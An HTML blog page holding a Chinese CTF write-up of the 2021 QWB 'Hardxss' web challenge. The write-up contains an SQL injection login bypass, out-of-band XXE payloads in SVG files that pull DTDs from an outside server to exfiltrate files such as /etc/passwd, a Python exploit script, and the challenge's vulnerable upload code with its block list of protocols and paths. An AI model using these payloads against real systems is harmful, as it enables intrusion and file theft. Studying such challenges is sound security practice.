<!DOCTYPE html>
<html>

	<head>
		
<title>QWB_Hardxss-Quiet</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link rel="shortcut icon" type="image/x-icon" href="/image/favicon.ico">


<meta name="keywords" content="web,ctf,">
<meta name="description" content="">


<script src="/js/jquery.min.js"></script>


	<meta name="generator" content="Hexo 5.4.0"></head>

	<body>
		
<link rel="stylesheet" href="/css/page.css">


<link rel="stylesheet" href="/css/page_cente.css">


<link rel="stylesheet" href="/css/atom-one-dark.css">


<link rel="stylesheet" href="/css/header.css">

	<div class="header">
		<div class="header-top">
			<div class="h-left">
				<a href="/">
					<img src="/image/logo.png" alt="Quiet">
				</a>
			</div>
			<div class="h-right">
				<ul>
					
						
								<li>
									<a href="/">
										HOME
									</a>
									<span class="dot"></span>
								</li>
								
									
						
								<li>
									<a href="/archives">
										ARCHIVE
									</a>
									<span class="dot"></span>
								</li>
								
									
						
								<li>
									<a href="/categories">
										CATEGORIES
									</a>
									<span class="dot"></span>
								</li>
								
									
						
								<li>
									<a href="/tags">
										TAGS
									</a>
									<span class="dot"></span>
								</li>
								
									
						
								<li>
									<a href="/links">
										LINKS
									</a>
									<span class="dot"></span>
								</li>
								
									
						
								<li>
									<a href="/about">
										ABOUT
									</a>
									<span class="dot"></span>
								</li>
								
									
				</ul>
			</div>
			<div class="h-right-close">
				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24">
					<path fill="none" d="M0 0h24v24H0z" />
					<path d="M3 4h18v2H3V4zm0 7h18v2H3v-2zm0 7h18v2H3v-2z" fill="rgba(68,68,68,1)" />
				</svg>
			</div>
		</div>
	</div>
	<div class="sidebar">
    <div class="topo">
        <h2>KKfine</h2>
    </div>
    <ul>
        
        <li>
            <a href="/">HOME</a>
        </li>
        
        <li>
            <a href="/archives">ARCHIVE</a>
        </li>
        
        <li>
            <a href="/categories">CATEGORIES</a>
        </li>
        
        <li>
            <a href="/tags">TAGS</a>
        </li>
        
        <li>
            <a href="/links">LINKS</a>
        </li>
        
        <li>
            <a href="/about">ABOUT</a>
        </li>
        
    </ul>
    <div class="my_foot">
        
        <a target="_blank" rel="noopener" href="https://github.com/qiaobug">
            <img src="https://cdn.jsdelivr.net/gh/duogongneng/MyBlogImg/imggithub.png" alt="Quiet主题">
        </a>
        
    </div>
</div>
<div class='shelter'
    style='cursor: pointer;display: none; position: fixed;left: 0;top: 0; right: 0;bottom: 0;background-color: #fffff0;opacity:0.5;z-index: 108;'>
</div>
<style>
    .sidebar {
        width: 0;
        height: 100%;
        position: fixed;
        top: 0;
        right: 0;
        bottom: 0;
        background: #fff;
        z-index: 999;
        text-align: center;
        box-shadow: -6px 0 20px rgba(98, 94, 94, .815)
    }

    .topo {
        width: 100%;
        height: 200px;
        background: url(https://api.ixiaowai.cn/gqapi/gqapi.php) no-repeat;
        background-size: 100% 100%;
        position: relative;
        display: flex;
        align-items: flex-end
    }

    .topo h2 {
        color: #fff;
        z-index: 1;
        position: relative;
        margin: 0 0 10px 10px;
        font-size: 1.2em;
        box-sizing: border-box
    }

    .topo:before {
        content: '';
        background-image: url(/image/pattern.png);
        background-repeat: repeat;
        height: 100%;
        left: 0;
        position: absolute;
        top: 0;
        width: 100%;
        z-index: 1
    }

    .sidebar ul {
        width: 100%;
        margin-top: 50px
    }

    .sidebar ul li {
        height: 50px;
        list-style: none;
        font-size: 1.2em;
        text-align: right;
        margin-right: 10px
    }

    .sidebar ul li a {
        display: grid;
        color: #5d606a;
        text-overflow: ellipsis;
        width: 100%;
        text-decoration: none
    }

    .my_foot {
        width: 100%;
        padding: 10px;
        margin-bottom: 10px;
        position: absolute;
        bottom: 0
    }

    .my_foot a {
        text-decoration: none;
        margin-right: 10px;
        display: inline-block
    }

    .my_foot a img {
        width: 30px;
        height: 30px
    }
</style>

<script>
    $(function () { $('.h-right-close>svg').click(function () { $('.sidebar').animate({ width: "66%" }, 500); $('.shelter').fadeIn("slow") }); $('.shelter').click(function (e) { $('.sidebar').animate({ width: "0" }, 500); $('.shelter').fadeOut("slow") }) })
</script>
		<script>
			$(function () { $(window).scroll(function () { if ($(document).scrollTop() > 100) { $(".header-top").removeClass("header-move2"); $('.header-top').addClass('header-move1') } else { $(".header-top").removeClass("header-move1"); $('.header-top').addClass('header-move2') } }) });
		</script>
<div class="header-bg bg-content-img">
    <div class="bg-content">
        <ul class="tag">
            
            
            <li><a href="/tags/web">web</a></li>
            
            <li><a href="/tags/ctf">ctf</a></li>
            
            
        </ul>
        <h1>QWB_Hardxss</h1>
        <div class="article-info">
            <div class="article-author">
                
                <svg t="1604839279282" class="icon" viewBox="0 0 1024 1024" version="1.1"
                    xmlns="http://www.w3.org/2000/svg" p-id="2901" width="20" height="20">
                    <path
                        d="M513 956.3c-247.7 0-448-200.3-448-448S265.3 66.2 513 66.2s448 200.3 448 448-200.3 442.1-448 442.1z m0-830.9c-212.2 0-388.8 170.7-388.8 388.8C124.2 726.3 294.9 903 513 903c212.2 0 388.8-170.7 388.8-388.8S725.2 125.4 513 125.4z m0 430.2c-94.2 0-170.7-76.5-170.7-170.7S418.8 207.8 513 207.8s170.7 76.5 170.7 170.7S607.2 555.6 513 555.6z m0-289.1c-64.6 0-112 52.8-112 112s47.4 117.9 112 117.9 112-52.8 112-112-47.4-117.9-112-117.9z m0 689.8c-135.7 0-259-58.7-341.9-158.9l-11.8-17.8 11.8-17.8c76.5-117.9 206.2-188.5 347.8-188.5 135.7 0 265 64.6 341.9 182.6l11.8 17.8-11.8 17.8C778 897.1 648.7 956.3 513 956.3zM230.3 773.2C300.9 849.7 406.9 897 513 897c112 0 218.1-47.4 288.6-129.8-70.5-88.2-170.7-135.6-282.7-135.6s-218.1 53.3-288.6 141.6z"
                        p-id="2902" fill="#ffffff"></path>
                </svg>
                
                <span> <a href="">KKfine</a></span>
                <p>2021-07-23 12:46:30</p>
            </div>
        </div>
    </div>
</div>
<div class="article-content">
    <div id="article" class="content">
        <h1 id="QWB-Hardxss"><a href="#QWB-Hardxss" class="headerlink" title="QWB_Hardxss"></a>QWB_Hardxss</h1><p>这道题属实超出了自己的知识范围，很多东西不是很懂，前几天先把XML，DTD的基础知识看了下，再来看这题，但还是有些云里雾里，太菜了。</p>
<p>入手只有登录可以进去，简单测试了下，很明显发现一些注入关键词被过滤掉了，然后试试万能密码<code>admin&#39;or(1=1)#</code>抓包发现返回了cookie，但还是登陆不上。</p>
<p><img src="https://img-blog.csdnimg.cn/0e82937ad3d8403292b8208410f70390.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>在js中手动设置cookie,<code>document.cookie=&quot;PHPSESSID=utf3df914s2ira67rnoeifom10&quot;</code></p>
<p>登录成功后，可以看到一个上传界面</p>
<p><img src="https://img-blog.csdnimg.cn/60c4ef1ebc4443e4a7d0dce5ca7f0d85.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>然后就只能对着WP做了，因为自己还没接触过XXE注入。</p>
<p>根据登录界面的提示<code>外部引用</code>，<code>矢量图</code>，则可以想到使用svg来上传图片，进行XXE注入</p>
<p><img src="https://img-blog.csdnimg.cn/509ed1ee600344329a5a3ba36a62d433.png" alt="在这里插入图片描述"></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">ANY</span>[</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">secret</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://39.107.239.30:80/1.php&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">visit_hacker</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://39.107.239.30:80/xxe.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">%visit_hacker;</span><br><span class="hljs-meta">%hacker;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">hacker</span>&gt;</span><span class="hljs-symbol">&amp;sending;</span><span class="hljs-tag">&lt;/<span class="hljs-name">hacker</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>1.php中为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=../../../../../../etc/passwd&quot;</span>;<br><br></code></pre></td></tr></table></figure>

<p>xxe.dtd中为</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">hacker</span> <span class="hljs-meta-string">&quot;&lt;!ENTITY sending SYSTEM &#x27;%secret;&#x27;&gt;&quot;</span>&gt;</span> <br>这个地方最开始不小心在secret前面加了个/，一直没发现浪费了贼多时间<br></code></pre></td></tr></table></figure>



<p>不知道是不是buu环境的问题，上传的svg一直显示<code>Not Image!</code>。直接拿wp读取到的源码先看看吧。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>session_start();<br><span class="hljs-comment">// ini_set(&quot;display_errors&quot;,&quot;off&quot;);</span><br><span class="hljs-comment">// error_reporting(0);</span><br><span class="hljs-keyword">if</span>(!array_key_exists(<span class="hljs-string">&quot;login&quot;</span>,<span class="hljs-variable">$_SESSION</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;login first&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;login&quot;</span>]===<span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;login first&quot;</span>);<br>&#125;<br><span class="hljs-variable">$encode</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;data&quot;</span>];<br><span class="hljs-keyword">if</span>(substr(<span class="hljs-variable">$encode</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>)!=<span class="hljs-string">&quot;data:&quot;</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;You!Hacker!&quot;</span>);<br>&#125;<br><span class="hljs-variable">$decode</span>=file_get_contents(<span class="hljs-variable">$encode</span>);<br><span class="hljs-comment">// var_dump($decode);</span><br><span class="hljs-keyword">if</span>(!(substr(<span class="hljs-variable">$decode</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>)===<span class="hljs-string">&quot;\xFF\xD8&quot;</span> <span class="hljs-keyword">or</span> substr(<span class="hljs-variable">$decode</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>)===<span class="hljs-string">&quot;BM&quot;</span> <span class="hljs-keyword">or</span> substr(<span class="hljs-variable">$decode</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>)==<span class="hljs-string">&quot;\x89\x50&quot;</span> <span class="hljs-keyword">or</span> substr(<span class="hljs-variable">$decode</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>)===<span class="hljs-string">&quot;GI&quot;</span>))&#123;<br>    <span class="hljs-comment">// libxml_disable_entity_loader(true);</span><br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> DOMDocument();<br>    <span class="hljs-variable">$res</span>=<span class="hljs-variable">$dom</span>-&gt;loadXML(<span class="hljs-variable">$decode</span>,LIBXML_DTDLOAD);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$res</span>)<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Not Image!&quot;</span>);<br>    <span class="hljs-variable">$decode1</span>=<span class="hljs-variable">$dom</span>-&gt;saveXML();<br>    <span class="hljs-comment">// highlight_string($deocde1);</span><br>    <span class="hljs-comment">//防止本地文件读取</span><br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/file:|data:|zlib:|php:\/\/stdin|php:\/\/input|php:\/\/fd|php:\/\/memory|php:\/\/temp|expect:|ogg:|rar:|glob:|phar:|ftp:|ssh2:|bzip2:|zip:|ftps:/i&quot;</span>,<span class="hljs-variable">$decode1</span>,<span class="hljs-variable">$matches</span>))<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;unsupport protocol: &quot;</span>.<span class="hljs-variable">$matches</span>[<span class="hljs-number">0</span>]);<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/\/var|\/etc|\.\.|\/proc/i&quot;</span>,<span class="hljs-variable">$decode1</span>,<span class="hljs-variable">$matches</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Illegal URI: &quot;</span>.<span class="hljs-variable">$matches</span>[<span class="hljs-number">0</span>]);<br>    &#125;<br>    <span class="hljs-variable">$res</span>=<span class="hljs-variable">$dom</span>-&gt;loadXML(<span class="hljs-variable">$decode</span>,LIBXML_NOENT);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$res</span>)<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Not Image!&quot;</span>);<br>    <span class="hljs-variable">$decode</span>=<span class="hljs-variable">$dom</span>-&gt;saveXML();<br>    <br>    <span class="hljs-comment">// highlight_string($decode);</span><br>    <span class="hljs-comment">//防止xss</span><br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/script|object|embed|onload\s*=/i&quot;</span>,<span class="hljs-variable">$decode</span>))<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no script!&quot;</span>);<br>    <span class="hljs-comment">// $encode=&quot;data:image/svg+xml;base64,&quot;.base64_encode($decode);</span><br>&#125;<br><span class="hljs-variable">$filename</span>=md5(rand());<br>file_put_contents(<span class="hljs-string">&quot;../upload/&quot;</span>.<span class="hljs-variable">$filename</span>,<span class="hljs-variable">$decode</span>);<br><span class="hljs-variable">$filename</span>=<span class="hljs-string">&#x27;/upload/&#x27;</span>.<span class="hljs-variable">$filename</span>;<br><span class="hljs-variable">$con</span>=<span class="hljs-keyword">new</span> mysqli(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-string">&quot;ctf&quot;</span>,<span class="hljs-string">&quot;123456&quot;</span>,<span class="hljs-string">&quot;ctf&quot;</span>);<br><span class="hljs-variable">$res</span>=<span class="hljs-variable">$con</span>-&gt;query(<span class="hljs-string">&quot;select img from avatar where userid=<span class="hljs-subst">$_SESSION</span>[login]&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>-&gt;fetch_row())&#123;<br>        <span class="hljs-comment">// echo &quot;update avatar set img=&#x27;$filename&#x27; where userid=$_SESSION[login]&quot;;</span><br>        <span class="hljs-variable">$res</span>=<span class="hljs-variable">$con</span>-&gt;query(<span class="hljs-string">&quot;update avatar set img=&#x27;<span class="hljs-subst">$filename</span>&#x27; where userid=<span class="hljs-subst">$_SESSION</span>[login]&quot;</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>!==<span class="hljs-literal">TRUE</span>)&#123;<br>            <span class="hljs-comment">// echo $con-&gt;error;</span><br>            <span class="hljs-variable">$con</span>-&gt;close();<br>        &#125;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;update success&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$res</span>=<span class="hljs-variable">$con</span>-&gt;query(<span class="hljs-string">&quot;insert into avatar values(<span class="hljs-subst">$_SESSION</span>[login],&#x27;<span class="hljs-subst">$filename</span>&#x27;)&quot;</span>);<br><span class="hljs-variable">$con</span>-&gt;commit();<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;upload success&quot;</span>);<br><br><br></code></pre></td></tr></table></figure>



<p>对于上传的图像文件，对于png、jpg、bmp、gif直接读文件头识别出来后转存，对于其他文件头的按svg进行解析，解析失败的认为不是有效的图像文件返回not image。并且对xml进行了两次（不是两步）解析，第一次解析的时候<code>loadxml(LIBXML_DTDLOAD)</code>，没有LIBXML_DTDVAILD不会从参数实体文件读取内容(%file 不会被读入，如下图所示)，能够防止被本地文件被读取，也能防止js被外部引入。</p>
<p>这个要注意的是外带数据的如果是参数实体，要注意你服务器返回的得是合法的xml或者空白。</p>
<h2 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h2><p>通过<code>serviceWorker</code>来截取浏览器的请求，借鉴了西湖论剑的那个题解，西湖的那个题解现在我也看不懂….</p>
<h3 id="Service-Worker简介"><a href="#Service-Worker简介" class="headerlink" title="Service Worker简介"></a>Service Worker简介</h3><ul>
<li>Appcache用来处理网站的离线缓存，可以通过manifest文件指定浏览器缓存哪些文件以供离线访问。但Appcache有相当多的缺陷，对于整站中的多页缓存来说支持比较差，而Service Worker用来作为其替代。</li>
<li>Service Worker是浏览器在后台运行的脚本，与web页面分离，以更好地支持不需要web页面或用户交互的功能。也可以将其理解为一个介于客户端和服务端之间的代理服务器，拥有<strong>拦截请求、修改返回内容</strong>的权力。可以用来缓存并处理离线网页（用来XSS）。</li>
<li>Service Workers 要求<strong>必须在 HTTPS 下才能运行</strong>。为了便于本地开发，<strong>localhost</strong> 也被浏览器认为是安全源。</li>
<li>Service Workers<strong>没有访问 DOM 的能力</strong>。</li>
</ul>
<p>剩下的放张图，属实对xss这一快还不太会</p>
<p><img src="https://img-blog.csdnimg.cn/0c542dea2e5240bd9a145042b677df13.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h2><p>这是借鉴天枢的解法</p>
<p>直接拿exp吧，中间有我很多尝试的svg</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span>  re<br><span class="hljs-keyword">import</span>  base64<br>url = <span class="hljs-string">&#x27;http://7f02f7e5-c929-4078-9f06-5e6c4acea6db.node4.buuoj.cn/&#x27;</span><br>svg = <span class="hljs-string">b&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-string">&lt;!DOCTYPE ANY[</span><br><span class="hljs-string">&lt;!ENTITY % secret SYSTEM &quot;http://39.107.239.30:80/1.php&quot;&gt;</span><br><span class="hljs-string">&lt;!ENTITY % visit_hacker SYSTEM &quot;http://39.107.239.30:80/xxe2.xml&quot;&gt;</span><br><span class="hljs-string">%visit_hacker;</span><br><span class="hljs-string">%hacker;</span><br><span class="hljs-string">]&gt;</span><br><span class="hljs-string">&lt;hacker&gt;&amp;sending;&lt;/hacker&gt;&quot;&quot;&quot;</span><br>svg2 = <span class="hljs-string">b&quot;&quot;&quot;</span><br><span class="hljs-string">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-string">&lt;!DOCTYPE message [</span><br><span class="hljs-string">    &lt;!ENTITY % remote SYSTEM &quot;http://39.107.239.30:80/dtd&quot;&gt;  </span><br><span class="hljs-string">    %remote;</span><br><span class="hljs-string">    %start;</span><br><span class="hljs-string">    %send;</span><br><span class="hljs-string">]&gt;</span><br><span class="hljs-string">&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;</span><br><span class="hljs-string">&lt;/svg&gt;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-comment"># b&quot;&quot;&quot;&lt;!-- test.jpg --&gt;</span><br><span class="hljs-comment"># &lt;?xml version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot;?&gt;</span><br><span class="hljs-comment"># &lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;&gt;</span><br><span class="hljs-comment"># &lt;xsl:template match=&quot;/&quot;&gt;</span><br><span class="hljs-comment"># &lt;html&gt;</span><br><span class="hljs-comment"># &lt;head&gt;&lt;style&gt;@keyframes x&#123;&#125;&lt;/style&gt;&lt;/head&gt;</span><br><span class="hljs-comment"># &lt;body&gt;</span><br><span class="hljs-comment"># &lt;svg style=&quot;animation-name:x&quot; onanimationend=&quot;alert(1);&quot;&gt;&lt;/svg&gt;</span><br><span class="hljs-comment"># &lt;/body&gt;&lt;/html&gt;</span><br><span class="hljs-comment"># &lt;/xsl:template&gt;</span><br><span class="hljs-comment"># &lt;/xsl:stylesheet&gt;</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># &quot;&quot;&quot;</span><br>svg3 = <span class="hljs-string">b&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;</span><br><span class="hljs-string">&lt;!DOCTYPE svg [</span><br><span class="hljs-string">&lt;!ELEMENT svg ANY &gt;</span><br><span class="hljs-string">&lt;!ENTITY % sp SYSTEM &quot;http://39.107.239.30:80/xxe.xml&quot;&gt;</span><br><span class="hljs-string">%sp;</span><br><span class="hljs-string">%param1;</span><br><span class="hljs-string">]&gt;</span><br><span class="hljs-string">&lt;svg viewBox=&quot;0 0 200 200&quot; version=&quot;1.2&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; style=&quot;fill:red&quot;&gt;</span><br><span class="hljs-string">      &lt;text x=&quot;15&quot; y=&quot;100&quot; style=&quot;fill:black&quot;&gt;XXE via SVG rasterization&lt;/text&gt;</span><br><span class="hljs-string">      &lt;rect x=&quot;0&quot; y=&quot;0&quot; rx=&quot;10&quot; ry=&quot;10&quot; width=&quot;200&quot; height=&quot;200&quot; style=&quot;fill:pink;opacity:0.7&quot;/&gt;</span><br><span class="hljs-string">      &lt;flowRoot font-size=&quot;15&quot;&gt;</span><br><span class="hljs-string">         &lt;flowRegion&gt;</span><br><span class="hljs-string">           &lt;rect x=&quot;0&quot; y=&quot;0&quot; width=&quot;200&quot; height=&quot;200&quot; style=&quot;fill:red;opacity:0.3&quot;/&gt;</span><br><span class="hljs-string">         &lt;/flowRegion&gt;</span><br><span class="hljs-string">         &lt;flowDiv&gt;</span><br><span class="hljs-string">            &lt;flowPara&gt;&amp;exfil;&lt;/flowPara&gt;</span><br><span class="hljs-string">         &lt;/flowDiv&gt;</span><br><span class="hljs-string">      &lt;/flowRoot&gt;</span><br><span class="hljs-string">&lt;/svg&gt; </span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>s = requests.Session()<br>s.cookies[<span class="hljs-string">&quot;PHPSESSID&quot;</span>]= <span class="hljs-string">&quot;PHPSESSID=9nas0jatppeftralq58d60apre&quot;</span><br>res = s.post(url+<span class="hljs-string">&#x27;login/login.php&#x27;</span>,<br>             data=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&#x27;or(1=1)#&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;123&quot;</span>&#125;,<br>             headers=&#123;<span class="hljs-string">&quot;Cookie&quot;</span>:<span class="hljs-string">&quot;PHPSESSID=9nas0jatppeftralq58d60apre&quot;</span>&#125;)<br><br>res2 = s.post(url=url+<span class="hljs-string">&#x27;user/upload.php&#x27;</span>,<br>              data=&#123;<span class="hljs-string">&quot;data&quot;</span>:<span class="hljs-string">b&quot;data:image/svg+xml;base64,&quot;</span>+base64.b64encode(svg2)&#125;,<br>              cookies=&#123;<span class="hljs-string">&quot;PHPSESSID&quot;</span>:<span class="hljs-string">&quot;9nas0jatppeftralq58d60apre&quot;</span>&#125;)<br><span class="hljs-built_in">print</span>(res2.text)<br><span class="hljs-built_in">print</span>(base64.b64encode(svg))<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;success&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> res2.text:<br>    exit(<span class="hljs-number">1</span>)<br>res3 = s.get(url=url+<span class="hljs-string">&#x27;user/&#x27;</span>,cookies=&#123;<span class="hljs-string">&quot;PHPSESSID&quot;</span>:<span class="hljs-string">&quot;9nas0jatppeftralq58d60apre&quot;</span>&#125;)<br><span class="hljs-comment"># print(res3.text)</span><br><br>u = re.findall(<span class="hljs-string">r&#x27;&lt;embed id=&quot;prebox&quot; src=&quot;\/upload\/([0-9a-zA-z]+)&quot;&#x27;</span>,res3.text)<br>u = <span class="hljs-string">&quot;upload/&quot;</span>+u[<span class="hljs-number">0</span>]<br><br>res4 = s.get(url=url+u).text<br><span class="hljs-built_in">print</span>(res4)<br><br><br><br><br><br></code></pre></td></tr></table></figure>

<p>后面改了一下脚本竟然拿到了，真是太不容易了，才发现好像不一定是非要<code>sucesss</code>才行。</p>
<p><img src="https://img-blog.csdnimg.cn/4e93e126baa046e091b1f44aa092420a.png" alt="在这里插入图片描述"></p>
<figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js">&lt;script &gt;<br><span class="hljs-built_in">document</span>.domain=<span class="hljs-string">&quot;cubestone.com&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pageload</span>(<span class="hljs-params">data</span>)</span>&#123;<br>    <span class="hljs-built_in">document</span>.body.innerText=data;<br>&#125;<br>fetch(<span class="hljs-string">`loader.php?callback=pageload&amp;secret=cube`</span>).then(<span class="hljs-function">(<span class="hljs-params">res</span>)=&gt;</span>&#123;<span class="hljs-keyword">return</span> res.text();&#125;).then(<span class="hljs-function">(<span class="hljs-params">data</span>)=&gt;</span>&#123;<span class="hljs-built_in">eval</span>(data);&#125;)&lt;/script&gt;<br><br></code></pre></td></tr></table></figure>

<p>拿到<code>upload.php</code>源码</p>
<p><img src="https://img-blog.csdnimg.cn/153fad9a5b104fbe97463dc162a71b5b.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>接着又试了下天枢的那个方法，通了，太痛苦了呜呜呜，是我xml中的dtd中有个地方多写了个<code>/</code>，啊这题看了两天太痛苦了。</p>
<p>读到了<code>/etc/passwd</code></p>
<p><img src="https://img-blog.csdnimg.cn/0641ecd64f854cd5a2a416bd2bc10752.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>到这就实现了任意文件读取了~~</p>
<p><img src="https://img-blog.csdnimg.cn/91ab5f2234bf4317bf61d64f06e0c848.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><code>flag&#123;632e6e01-d5aa-400a-9f91-bc3c4856fc96&#125;</code>。</p>
<p>终于做出来了，这两天学xxe也学到了很多，虽然有个小错误浪费了我很多时间，但找错误的过程也学了很多，这个暑假把XSS的知识得好好学学，还有JS的代码也得认真学学了，西湖论剑的那个方法还没咋看懂，再学学js再看。</p>
<p>参考文章</p>
<p><a target="_blank" rel="noopener" href="https://hachp1.github.io/posts/Web%E5%AE%89%E5%85%A8/20201019-sw_safe.html">https://hachp1.github.io/posts/Web%E5%AE%89%E5%85%A8/20201019-sw_safe.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.funnything.net/2021/06/15/2021-qwb-web-harderxss-writeup/">https://blog.funnything.net/2021/06/15/2021-qwb-web-harderxss-writeup/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.icystal.top/ctf15-qwb2021harderxss/">https://www.icystal.top/ctf15-qwb2021harderxss/</a></p>

    </div>
</div>
<style>
    #noneimg img {
        display: none;
        z-index: 109;
        width: 600px !important;
        border-radius: 0px;
        position: fixed;
        box-shadow: 0 0 0px #c3c3c300 !important;
        left: 0;
        top: 0;
        right: 0;
        bottom: 0;
        margin: auto !important;
    }

    @media screen and (max-width:600px) {
        #noneimg img {
            width: 88%
        }
    }
</style>
<script>
